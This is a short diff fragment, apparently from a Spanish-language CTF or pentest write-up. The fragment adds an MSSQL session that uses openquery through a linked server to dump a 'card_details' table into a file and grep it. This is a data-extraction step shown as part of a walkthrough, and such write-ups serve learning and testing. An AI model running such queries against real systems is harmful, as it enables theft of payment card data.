@@ -222,3 +222,11 @@ queue_messages_2041058307
 `tenemos un cred_details`
 Si enviamos su contenido a un archivo.txt y después podemos hacer un cat para leerlo
 
+```python
+1> select * from openquery("web\clients", 'select * from clients..card_details');
+2> go > out.txt
+1> exit
+
+❯ cat out.txt | grep CONTEXT
+```
+
